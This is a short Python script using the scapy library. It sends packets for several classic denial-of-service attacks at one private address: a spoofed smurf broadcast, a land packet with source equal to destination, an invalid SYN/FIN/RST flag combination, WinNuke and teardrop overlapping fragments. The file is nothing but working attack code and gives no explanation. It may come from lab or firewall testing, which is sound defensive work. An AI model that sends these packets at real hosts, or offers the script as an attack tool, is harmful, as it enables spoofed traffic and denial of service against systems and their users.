#coding=utf8
from scapy.all import *
#smurf
send(IP(src='192.168.10.250',dst='192.168.10.255')/ICMP())
#landbase
send(IP(src='192.168.10.250',dst='192.168.10.250')/TCP())
#synflag
send(IP(dst='192.168.10.250')/TCP(flags='SFR'))
#winnuke
send(IP(dst='192.168.10.250')/TCP(dport=139,flags='SU',urgptr=1))
#teardrop
send(IP(dst='192.168.10.250',id=42,flags="MF")/UDP()/('x'*10))
send(IP(dst='192.168.10.250',id=42,frag=48)/('x'*116))
send(IP(dst='192.168.10.250',id=42,flags="MF")/UDP()/('x'*224))

